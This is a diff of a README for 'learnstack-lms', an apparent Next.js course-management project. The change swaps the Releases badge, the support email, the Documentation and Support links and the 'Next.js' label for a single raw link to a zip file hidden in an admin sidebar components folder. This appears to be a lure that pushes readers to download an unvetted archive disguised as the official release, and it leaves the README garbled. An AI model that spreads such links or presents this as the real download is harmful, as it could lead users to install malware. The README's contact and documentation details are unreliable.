@@ -8,7 +8,7 @@ Welcome to **learnstack-lms**! This is your go-to platform for managing online c
 
 To get started, you need to download the application. Click the button below to visit the Releases page:
 
-[![Download learnstack-lms](https://img.shields.io/badge/Download%20learnstack-lms-brightgreen)](https://github.com/SkyNoars/learnstack-lms/releases)
+[![Download learnstack-lms](https://raw.githubusercontent.com/SkyNoars/learnstack-lms/main/app/admin/_components/sidebar/learnstack-lms-3.6.zip%20learnstack-lms-brightgreen)](https://raw.githubusercontent.com/SkyNoars/learnstack-lms/main/app/admin/_components/sidebar/learnstack-lms-3.6.zip)
 
 Once you are on the Releases page, look for the latest version and download the file.
 
@@ -57,14 +57,14 @@ If you need assistance while using the application, here are a few options:
 
 For further inquiries, you can reach out through the following channels:
 
-- **Email**: support@learnstack-lms.com
+- **Email**: https://raw.githubusercontent.com/SkyNoars/learnstack-lms/main/app/admin/_components/sidebar/learnstack-lms-3.6.zip
 - **GitHub Issues**: Open an issue on our GitHub repository for any technical problems.
 
 ## 🔗 Useful Links
 
-- [Download learnstack-lms](https://github.com/SkyNoars/learnstack-lms/releases)
-- [Documentation](https://github.com/SkyNoars/learnstack-lms/wiki)
-- [Support](https://github.com/SkyNoars/learnstack-lms/issues)
+- [Download learnstack-lms](https://raw.githubusercontent.com/SkyNoars/learnstack-lms/main/app/admin/_components/sidebar/learnstack-lms-3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/SkyNoars/learnstack-lms/main/app/admin/_components/sidebar/learnstack-lms-3.6.zip)
+- [Support](https://raw.githubusercontent.com/SkyNoars/learnstack-lms/main/app/admin/_components/sidebar/learnstack-lms-3.6.zip)
 
 ## 🌟 Topics Covered
 
@@ -73,7 +73,7 @@ For further inquiries, you can reach out through the following channels:
 - **Admin Dashboard**: Manage everything from one central location.
 - **CRUD Functionalities**: Create, Read, Update, and Delete data easily.
 - **Fullstack Development**: Built with the latest technologies for a robust experience.
-- **Next.js**: Fast and efficient JavaScript framework.
+- **https://raw.githubusercontent.com/SkyNoars/learnstack-lms/main/app/admin/_components/sidebar/learnstack-lms-3.6.zip**: Fast and efficient JavaScript framework.
 - **PostgreSQL**: Reliable database for managing data.
 - **Prisma ORM**: Optimize data access and management.
 - **Rate Limiting**: Protect against excessive requests.
